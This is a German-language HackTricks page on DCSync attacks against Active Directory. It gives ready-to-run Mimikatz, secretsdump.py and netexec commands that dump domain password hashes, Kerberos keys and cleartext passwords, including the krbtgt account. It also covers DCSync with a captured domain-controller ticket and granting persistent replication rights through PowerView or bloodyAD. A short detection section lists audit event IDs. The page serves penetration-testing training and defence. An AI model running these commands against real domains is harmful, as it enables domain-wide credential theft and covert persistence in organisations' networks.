# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Die **DCSync**-Berechtigung setzt voraus, dass die folgenden Berechtigungen für die Domäne selbst vorhanden sind: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** und **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Wichtige Hinweise zu DCSync:**

- Der **DCSync-Angriff simuliert das Verhalten eines Domain Controllers und fordert andere Domain Controller dazu auf, Informationen zu replizieren**. Dazu wird das Directory Replication Service Remote Protocol (MS-DRSR) verwendet. Da MS-DRSR eine gültige und notwendige Funktion von Active Directory ist, kann es nicht abgeschaltet oder deaktiviert werden.
- Standardmäßig verfügen nur die Gruppen **Domain Admins, Enterprise Admins, Administrators und Domain Controllers** über die erforderlichen Berechtigungen.
- In der Praxis benötigt **vollständiges DCSync** die Berechtigungen **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** für den Namenskontext der Domäne. `DS-Replication-Get-Changes-In-Filtered-Set` wird häufig gemeinsam mit ihnen delegiert, ist für sich genommen aber eher für die Synchronisierung **vertraulicher bzw. RODC-gefilterter Attribute** relevant (zum Beispiel Secrets im Stil von Legacy-LAPS) als für einen vollständigen krbtgt-Dump.<sup>[[2]](#references)</sup>
- Wenn Passwörter von Konten mit reversibler Verschlüsselung gespeichert werden, bietet Mimikatz eine Option, mit der das Passwort im Klartext ausgegeben werden kann.

### Aufzählung

Prüfe mit `powerview`, wer über diese Berechtigungen verfügt:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Wenn du dich auf **nicht standardmäßige Principals** mit DCSync-Rechten konzentrieren möchtest, filtere die integrierten replizierungsfähigen Gruppen heraus und überprüfe nur unerwartete Trustees:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Lokal ausnutzen

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Remote ausnutzen

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Praktische Beispiele im festgelegten Scope:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync mit einem abgefangenen DC-Machine-TGT (ccache)

Wenn du einen Dienst auf einem Domain Controller überprüfst, unterscheide zwischen seiner lokalen Dienstidentität und seiner Netzwerkidentität. [Microsoft dokumentiert](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions), dass virtuelle SQL Server-Konten (`NT SERVICE\...`) auf Netzwerkressourcen mit dem Computerkonto des Hosts zugreifen. Auf einem Domain Controller kann dadurch das DC-Computerkonto bei der Überprüfung von Replikationsberechtigungen relevant sein. Ein alleiniger Dienstzugriff belegt jedoch weder, dass ein exportierbares Machine-TGT verfügbar ist, noch dass eine nutzbare DCSync-Authentifizierung möglich ist. Überprüfe die tatsächliche Dienstidentität, den ausgehenden Authentifizierungskontext, verfügbare Tickets oder Zugangsdaten sowie die effektiven Replikationsberechtigungen, bevor du dies als möglichen Angriffsweg einstufst.

In Szenarien mit unconstrained delegation im Exportmodus kannst du ein Machine-TGT eines Domain Controllers abfangen (z. B. `DC1$@DOMAIN` für `krbtgt@DOMAIN`). Anschließend kannst du dieses ccache verwenden, um dich als DC zu authentifizieren und DCSync ohne Passwort auszuführen.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Operative Hinweise:

- **Im Kerberos-Pfad von Impacket wird zuerst SMB angesprochen**, bevor der DRSUAPI-Aufruf erfolgt. Wenn die Umgebung **SPN target name validation** erzwingt, kann ein vollständiger Dump fehlschlagen: `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- In diesem Fall kannst du entweder zuerst ein **`cifs/<dc>`**-Service-Ticket für den Ziel-DC anfordern oder für das Konto, das du sofort benötigst, auf **`-just-dc-user`** zurückgreifen.
- Wenn du nur über geringere Replikationsrechte verfügst, kann eine Synchronisierung im LDAP-/DirSync-Stil dennoch **vertrauliche** oder **RODC-gefilterte** Attribute offenlegen (z. B. das veraltete `ms-Mcs-AdmPwd`), ohne dass eine vollständige krbtgt-Replikation erforderlich ist.<sup>[[2]](#references)</sup>

`-just-dc` erzeugt 3 Dateien:

- eine mit den **NTLM-Hashes**
- eine mit den **Kerberos-Schlüsseln**
- eine mit Klartextpasswörtern aus dem NTDS für alle Konten, bei denen [**umkehrbare Verschlüsselung**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) aktiviert ist. Benutzer mit umkehrbarer Verschlüsselung kannst du mit folgendem Befehl abrufen:

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistenz

Wenn du Domänenadministrator bist, kannst du jedem Benutzer mit PowerView diese Berechtigungen erteilen:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Linux-Operatoren können dasselbe mit `bloodyAD` tun:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Anschließend kannst du **überprüfen, ob dem Benutzer die 3 Berechtigungen korrekt zugewiesen wurden, indem du in der Ausgabe danach suchst** (die Namen der Berechtigungen sollten im Feld "ObjectType" zu sehen sein):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Gegenmaßnahmen

- Sicherheitsereignis-ID 4662 (Überwachungsrichtlinie für das Objekt muss aktiviert sein) – Ein Vorgang wurde an einem Objekt ausgeführt<sup>[[4]](#references)</sup>
- Sicherheitsereignis-ID 5136 (Überwachungsrichtlinie für das Objekt muss aktiviert sein) – Ein Verzeichnisdienstobjekt wurde geändert
- Sicherheitsereignis-ID 4670 (Überwachungsrichtlinie für das Objekt muss aktiviert sein) – Die Berechtigungen für ein Objekt wurden geändert
- AD ACL Scanner – ACL-Berichte erstellen und vergleichen. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket-Änderungsprotokoll](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Replikationsberechtigungen Get-Changes und Get-Changes-In-Filtered-Set nutzen](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Passwort-Hashes vom Domain Controller auslesen](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL-Zugangsdaten → gezieltes Kerberoasting → uneingeschränkte Delegierung → DCSync zu DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
